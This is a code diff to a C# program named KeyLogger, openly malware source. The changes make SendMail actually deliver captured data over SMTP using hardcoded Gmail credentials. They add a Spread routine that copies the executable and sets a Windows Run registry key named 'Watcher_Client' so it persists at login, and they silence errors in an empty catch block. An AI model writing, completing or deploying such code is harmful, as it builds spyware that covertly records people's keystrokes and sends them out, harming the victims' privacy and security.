@@ -54,6 +54,7 @@ namespace KeyLogger
                     }
                 }
 
+                program.Spread();
                 using (var writer = new StreamWriter(filePath))
                 {
                     while (!checkSystemEvents)
@@ -102,7 +103,6 @@ namespace KeyLogger
 
         private void SendMail()
         {
-            var program = new Program();
             var date = DateTime.Now.ToString("dd-MM-yyyy-HH-mm");
             var user = Environment.UserName;
 
@@ -120,24 +120,26 @@ namespace KeyLogger
 
                 smtpServer.Port = 587;
                 smtpServer.Credentials = new System.Net.NetworkCredential("witviers@gmail.com", "haslo do maila");
-  
-
-
-
+                smtpServer.EnableSsl = true;
+                smtpServer.Send(mail);
             }
             catch (Exception ex)
             {
 
-                throw;
             }
         }
 
         private void Spread()
-        { 
-        
-        
-        
-        }
+        {
+            var targetPath = Path.Combine(path, appExe);
+            if (!File.Exists(Path.Combine(path, appExe)))
+            {
+                var fileInfo = new FileInfo(appName);
+                fileInfo.CopyTo(Path.Combine(path, appExe));
 
+                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                rk.SetValue("Watcher_Client", targetPath);
+            }       
+        }
     }
 }
